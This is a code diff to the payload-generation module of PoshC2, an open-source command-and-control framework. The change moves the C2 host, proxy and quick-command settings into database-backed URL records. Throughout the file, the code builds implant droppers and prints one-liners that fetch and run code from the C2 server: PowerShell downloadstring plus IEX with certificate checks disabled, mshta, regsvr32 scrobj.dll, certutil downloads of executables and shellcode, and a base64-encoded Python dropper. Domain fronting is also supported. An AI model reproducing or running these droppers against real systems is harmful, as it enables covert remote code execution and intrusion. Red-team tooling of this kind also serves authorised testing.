@@ -1,26 +1,37 @@
 from io import StringIO
 import gzip, base64, subprocess, os, hashlib
 
-from poshc2.server.Config import PayloadsDirectory, QuickCommand, PayloadTemplatesDirectory, DefaultMigrationProcess
+from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, DefaultMigrationProcess, DatabaseType
 from poshc2.Colours import Colours
 from poshc2.Utils import gen_key, randomuri, formStrMacro, formStr
+
+
+if DatabaseType.lower() == "postgres":
+    from poshc2.server.database.DBPostgres import get_url_by_id, get_default_url_id, select_item
+else:
+    from poshc2.server.database.DBSQLite import get_url_by_id, get_default_url_id, select_item
 
 
 class Payloads(object):
 
     quickstart = None
 
-    def __init__(self, KillDate, Key, PayloadCommsHost, Domainfrontheader, Serverport, Proxyuser, Proxypass, Proxyurl, ImplantType, Proxy,
-                 Insecure, UserAgent, Referrer, ConnectURL, BaseDirectory):
+    def __init__(self, KillDate, Key, Insecure, UserAgent, Referrer, ConnectURL, BaseDirectory, URLID = None, ImplantType = "", PowerShellProxyCommand = ""):
+        
+        if not URLID:
+            URLID = get_default_url_id()
+
+        self.URLID = URLID
+        urlDetails = get_url_by_id(self.URLID)
         self.KillDate = KillDate
         self.Key = Key
-        self.DomainFrontHeader = Domainfrontheader
-        self.PayloadCommsHost = PayloadCommsHost
-        self.Serverport = Serverport
-        self.Proxyuser = Proxyuser
-        self.Proxypass = Proxypass
-        self.Proxyurl = Proxyurl
-        self.Proxy = Proxy
+        self.QuickCommand = select_item("QuickCommand", "C2Server")
+        self.DomainFrontHeader = urlDetails[3]
+        self.PayloadCommsHost = urlDetails[2]
+        self.Proxyuser = urlDetails[4]
+        self.Proxypass = urlDetails[5]
+        self.Proxyurl = urlDetails[6]
+        self.PowerShellProxyCommand = PowerShellProxyCommand
         self.ImplantType = ImplantType
         self.Insecure = Insecure
         self.UserAgent = UserAgent
@@ -54,27 +65,29 @@ class Payloads(object):
         cs1 = cs.replace("#REPLACEPYTHONHASH#", self.PyDropperHash)
         cs2 = cs1.replace("#REPLACESPYTHONKEY#", self.PyDropperKey)
         cs3 = cs2.replace("#REPLACEKEY#", self.Key)
-        cs4 = cs3.replace("#REPLACEHOSTPORT#", (self.PayloadCommsHost + ":" + self.Serverport))
-        cs5 = cs4.replace("#REPLACEQUICKCOMMAND#", (self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "_py"))
-        cs6 = cs5.replace("#REPLACECONNECTURL#", (self.PayloadCommsHost + ":" + self.Serverport + self.ConnectURL + "?m"))
+        cs4 = cs3.replace("#REPLACEHOSTPORT#", self.PayloadCommsHost)
+        cs5 = cs4.replace("#REPLACEQUICKCOMMAND#", self.PayloadCommsHost + "/" + self.QuickCommand + "_py")
+        cs6 = cs5.replace("#REPLACECONNECTURL#", self.PayloadCommsHost + self.ConnectURL + "?m")
         cs7 = cs6.replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader)
         cs8 = cs7.replace("#REPLACEUSERAGENT#", self.UserAgent)
+        cs8 = cs8.replace("#REPLACEURLID#", str(self.URLID))
 
         with open("%sdropper.ps1" % PayloadTemplatesDirectory, 'r') as f:
             content = f.read()
 
         cs = str(content).replace("#REPLACEINSECURE#", self.Insecure)
-        cs1 = cs.replace("#REPLACEHOSTPORT#", (self.PayloadCommsHost + ":" + self.Serverport))
-        cs2 = cs1.replace("#REPLACEIMPTYPE#", (self.PayloadCommsHost + ":" + self.Serverport + self.ConnectURL + self.ImplantType))
+        cs1 = cs.replace("#REPLACEHOSTPORT#", self.PayloadCommsHost)
+        cs2 = cs1.replace("#REPLACEIMPTYPE#", (self.PayloadCommsHost + self.ConnectURL + self.ImplantType))
         cs3 = cs2.replace("#REPLACEKILLDATE#", self.KillDate)
         cs4 = cs3.replace("#REPLACEPROXYUSER#", self.Proxyuser)
         cs5 = cs4.replace("#REPLACEPROXYPASS#", self.Proxypass)
         cs6 = cs5.replace("#REPLACEPROXYURL#", self.Proxyurl)
-        cs7 = cs6.replace("#REPLACEPROXY#", self.Proxy)
+        cs7 = cs6.replace("#REPLACEPROXYCOMMAND#", self.PowerShellProxyCommand)
         cs8 = cs7.replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader)
         cs9 = cs8.replace("#REPLACECONNECT#", self.ConnectURL)
         cs10 = cs9.replace("#REPLACEUSERAGENT#", self.UserAgent)
         cs11 = cs10.replace("#REPLACEREFERER#", self.Referrer)
+        cs11 = cs11.replace("#REPLACEURLID#", str(self.URLID))
         self.PSDropper = cs11.replace("#REPLACEKEY#", self.Key)
         print()
 
@@ -198,8 +211,8 @@ class Payloads(object):
         with open("%sdropper.cs" % PayloadTemplatesDirectory, 'r') as f:
             content = f.read()
         cs = str(content).replace("#REPLACEKEY#", self.Key)
-        cs1 = cs.replace("#REPLACEBASEURL#", (self.PayloadCommsHost + ":" + self.Serverport))
-        cs2 = cs1.replace("#REPLACESTARTURL#", (self.PayloadCommsHost + ":" + self.Serverport + self.ConnectURL + "?c"))
+        cs1 = cs.replace("#REPLACEBASEURL#", self.PayloadCommsHost)
+        cs2 = cs1.replace("#REPLACESTARTURL#", (self.PayloadCommsHost + self.ConnectURL + "?c"))
         cs3 = cs2.replace("#REPLACEKILLDATE#", self.KillDate)
         cs4 = cs3.replace("#REPLACEDF#", self.DomainFrontHeader)
         cs5 = cs4.replace("#REPLACEUSERAGENT#", self.UserAgent)
@@ -207,6 +220,7 @@ class Payloads(object):
         cs7 = cs6.replace("#REPLACEPROXYURL#", self.Proxyurl)
         cs8 = cs7.replace("#REPLACEPROXYUSER#", self.Proxyuser)
         cs9 = cs8.replace("#REPLACEPROXYPASSWORD#", self.Proxypass)
+        cs9 = cs9.replace("#REPLACEURLID#", str(self.URLID))
 
         self.QuickstartLog("C# Dropper Payload written to: %s%sdropper.cs" % (self.BaseDirectory, name))
         filename = "%s%sdropper.cs" % (self.BaseDirectory, name)
@@ -372,10 +386,10 @@ a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec b
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("Execution via Command Prompt" + Colours.GREEN)
 
-        psuri = self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "_rp"
+        psuri = self.PayloadCommsHost + "/" + self.QuickCommand + "_rp"
         pscmd = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('%s')));IEX $MS" % psuri
         psurienc = base64.b64encode(pscmd.encode('UTF-16LE'))
-        uri = self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "_cs"
+        uri = self.PayloadCommsHost + "/" + self.QuickCommand + "_cs"
 
         # only run if the domainfrontheader is null
         if self.DomainFrontHeader:
@@ -386,7 +400,7 @@ a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec b
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("Other Execution Methods" + Colours.GREEN)
         self.QuickstartLog("mshta.exe vbscript:GetObject(\"script:%s\")(window.close)" % uri)
-        uri = self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "_rg"
+        uri = self.PayloadCommsHost + "/" + self.QuickCommand + "_rg"
         self.QuickstartLog("regsvr32 /s /n /u /i:%s scrobj.dll" % uri)
         self.QuickstartLog("")
 
@@ -484,10 +498,11 @@ ao.run('%s', 0);window.close();
         cs1 = cs.replace("#REPLACEPYTHONHASH#", self.PyDropperHash)
         cs2 = cs1.replace("#REPLACESPYTHONKEY#", self.PyDropperKey)
         cs3 = cs2.replace("#REPLACEKEY#", self.Key)
-        cs4 = cs3.replace("#REPLACEHOSTPORT#", (self.PayloadCommsHost + ":" + self.Serverport))
-        cs5 = cs4.replace("#REPLACEQUICKCOMMAND#", (self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "_py"))
-        cs6 = cs5.replace("#REPLACECONNECTURL#", (self.PayloadCommsHost + ":" + self.Serverport + self.ConnectURL + "?m"))
+        cs4 = cs3.replace("#REPLACEHOSTPORT#", self.PayloadCommsHost)
+        cs5 = cs4.replace("#REPLACEQUICKCOMMAND#", self.PayloadCommsHost + "/" + self.QuickCommand + "_py")
+        cs6 = cs5.replace("#REPLACECONNECTURL#", (self.PayloadCommsHost + self.ConnectURL + "?m"))
         cs7 = cs6.replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader)
+        cs7 = cs7.replace("#REPLACEURLID#", str(self.URLID))
         self.PyDropper = cs7.replace("#REPLACEUSERAGENT#", self.UserAgent)
         py = base64.b64encode(self.PyDropper.encode('UTF-8'))
         pydropper_bash = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python2 &" % py.decode('UTF-8')
@@ -556,7 +571,7 @@ ao.run('%s', 0);window.close();
         output_file.close()
 
         try:
-            uri = self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "_ex64"
+            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "_ex64"
             filename = randomuri()
             self.QuickstartLog(Colours.END)
             self.QuickstartLog("Download Posh64 & Posh32 executables using certutil:" + Colours.GREEN)
@@ -569,7 +584,7 @@ ao.run('%s', 0);window.close();
                 compile32 = "i686-w64-mingw32-gcc -w %s%sPosh32.c -o %s%sPosh32.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
             subprocess.check_output(compile64, shell=True)
             subprocess.check_output(compile32, shell=True)
-            uri = self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "_ex86"
+            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "_ex86"
             filename = randomuri()
             self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.exe" % (uri, filename))
             if os.name == 'nt':
@@ -583,13 +598,13 @@ ao.run('%s', 0);window.close();
 
             self.QuickstartLog(Colours.END)
             self.QuickstartLog("Download Posh/Sharp x86 and x64 shellcode from the webserver:" + Colours.GREEN)
-            uri = self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "s/64/portal"
+            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "s/64/portal"
             self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
-            uri = self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "s/86/portal"
+            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "s/86/portal"
             self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
-            uri = self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "p/64/portal"
+            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "p/64/portal"
             self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
-            uri = self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "p/86/portal"
+            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "p/86/portal"
             self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
 
         except Exception as e:
